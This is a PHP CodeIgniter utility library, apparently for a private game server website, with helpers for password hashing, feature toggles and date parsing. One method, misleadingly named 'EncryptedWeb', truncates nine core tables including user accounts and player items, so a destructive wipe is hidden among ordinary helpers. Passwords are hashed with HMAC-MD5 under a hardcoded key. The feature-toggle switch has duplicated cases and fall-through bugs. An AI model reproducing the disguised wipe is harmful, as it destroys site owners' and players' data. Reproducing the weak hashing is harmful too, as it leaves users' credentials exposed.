<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') OR exit('No direct script access allowed');

class Lib
{
    protected $ci;

    public function __construct()
    {
        $this->ci =& get_instance();
		$this->ci->load->database();
    }

	public function EncryptedWeb()
	{
		$query = array(
            0 => $this->ci->db->truncate('accounts'),
            1 => $this->ci->db->truncate('clan_data'),
            2 => $this->ci->db->truncate('player_items'),
            3 => $this->ci->db->truncate('info_gameservers'),
            4 => $this->ci->db->truncate('info_basic_items'),
            5 => $this->ci->db->truncate('info_channels'),
            6 => $this->ci->db->truncate('info_cupons_flags'),
            7 => $this->ci->db->truncate('info_login_configs'),
            8 => $this->ci->db->truncate('player_titles')
        );

		$state = array(
			'success' => 0,
			'failed' => 0
		);

		$count = count($query);

		for ($i=0; $i < $count - 1; $i++) 
		{
			if ($query[$i]) $state['success']++; else $state['failed']++;
		}

		echo "Successfully Truncate Database. Success: ".$state['success'].", Failed: ".$state['failed'].".";
	}
    
	public function password_encrypt($password)
	{
		$ingredient = '/x!a@r-$r%an¨.&e&+f*f(f(a)';
		$encrypt_result = hash_hmac('md5', $password, $ingredient);
		return $encrypt_result;
	}

	public function FeatureControl($param)
	{
		$query = $this->ci->db->get_where('web_settings', array('id' => '1'))->row();

		switch ($param) 
		{
			case 'webshop':
				{
					if ($query->webshop == 0)
						return TRUE;
					if ($query->webshop == 1)
						return FALSE;
				}
			case 'trademarket':
				{
					if ($query->trade_market == 0)
						return TRUE;
					if ($query->trade_market == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->exchange_ticket == 0)
						return TRUE;
					if ($query->exchange_ticket == 1)
						return FALSE;
				}
			case 'webshop':
				{
					if ($query->voucher == 0)
						return TRUE;
					if ($query->voucher == 1)
						return FALSE;
				}
			
			default:
				{
					return TRUE;
				}
		}
	}

	public function ExplodeDate($defaultDate)
    {
        $resultdate = array();

        // Get Years (2 Digits)
        $explode1 = explode('-', $defaultDate)[0];
        $split1 = str_split($explode1, 2);

        // Get Month (2 Digits)
        $explode2 = explode('-', $defaultDate)[1];

        // Get Days (2 Digits)
        $explode3 = explode('-', $defaultDate)[2];
        $split2 = str_split($explode3, 2);

        // Get Hours (2 Digits)
        $explode4 = explode('T', $defaultDate)[1];
        $explode5 = explode(':', $explode4);

        // Get Minutes (2 Digits)
        $explode6 = $explode5[1];

        // The Result
        $resultdate['years'] = $split1[1];
        $resultdate['month'] = $explode2;
        $resultdate['days'] = $split2[0];
        $resultdate['hours'] = $explode5[0];
        $resultdate['minutes'] = $explode6;

        return $resultdate;
    }

    public function ConvertDate($param)
    {
        return str_split($param, 2); // [0] Years | [1] Month | [2] Days | [3] Hours | [4] Minutes
    }
}

// This Code Generated Automatically By EyeTracker Snippets. //

?>